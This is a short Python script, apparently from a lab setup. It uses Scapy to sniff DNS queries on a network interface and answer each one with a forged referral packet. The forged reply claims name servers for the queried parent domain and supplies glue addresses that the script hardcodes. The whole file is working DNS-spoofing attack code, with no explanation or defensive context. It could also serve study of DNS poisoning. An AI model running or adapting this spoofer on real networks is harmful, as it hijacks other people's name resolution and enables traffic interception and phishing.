
# cat -n send_referral_dns_responses.py 
from scapy.all import *

ttl=3

def dns_res(pkt):
    if pkt.haslayer(DNSQR):
        domain = ''
        query_string = pkt[DNS].qd.qname
        query_list = query_string.split('.')
        #print query_list
        for i in query_list[1:-1]:
            domain += i + '.'
        #print domain
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                    DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, qr=1L, aa=0L, tc=0L, rd=0L, ra=1L, z=0L,\
                        qdcount=1, ancount=0, nscount=2, arcount=2,\
                    an=None,\
                    ns=(DNSRR(rrname=domain,type='NS',ttl=ttl,rdata='ns1.'+domain)\
                        /DNSRR(rrname=domain,type='NS',ttl=ttl,rdata='ns2.'+domain)\
                        ),\
                    ar=(DNSRR(rrname='ns1.'+domain,type='A',ttl=ttl,rdata='1.1.1.1')\
                        /DNSRR(rrname='ns2.'+domain,type='A',ttl=ttl,rdata='2.2.2.2')\
                        ),\
                    )
        send(spoofed_pkt)

sniff(filter='udp and dst port 53', iface='eth0', store=0, prn=dns_res)